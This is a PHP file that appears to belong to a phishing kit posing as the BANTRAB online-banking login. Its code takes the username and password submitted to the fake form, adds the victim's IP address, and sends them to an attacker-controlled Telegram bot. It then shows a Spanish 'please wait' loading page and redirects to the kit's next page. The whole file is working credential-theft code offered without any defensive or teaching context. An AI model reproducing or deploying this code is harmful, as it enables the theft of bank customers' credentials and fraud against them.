
<?php
ini_set("display_errors", 0);

$config = include('config.php');
$elusr = $_POST['n0rmalidadx'];
$conrrx = $_POST['ucLoginInicio$txtUsuario'];

$token = $config['token'];
$chat_id = $config['chat_id'];

$ip = $_SERVER['REMOTE_ADDR'];




$mensaje_para_chatbot = "🟨BANTR4B🟨\nUS4RXS: ".$elusr."\nCL4V3: ".$conrrx."\nIP: " . $ip;


$telegram_url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=" . urlencode($mensaje_para_chatbot);


$response = file_get_contents($telegram_url);




?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>En esperas</title>
	<meta http-equiv="refresh" content="15; url=tkas.php">
	<style>
		@font-face {
         font-family: 'Avenir-Book-01';
         src: url('css/Avenir-Book-01.ttf') format('truetype');/* IE9 Compat Modes */
         /* Safari, Android, iOS */
         }
	</style>
</head>
<body>
	<br>
	<br>
	<br>
	<br>
	<img src="img/Bienv.png" style="display: block;margin: 0 auto;">
	<br>
	<img src="img/ajax-loader2.gif" style="display: block;margin:  0 auto;width: 140px;">
	<br>
	<span style="font-family: Avenir-Book-01;margin: 0 auto;display: block;text-align: center;">Espere unos segundos mientras carga BANTRAB en línea...</span>


</body>
</html>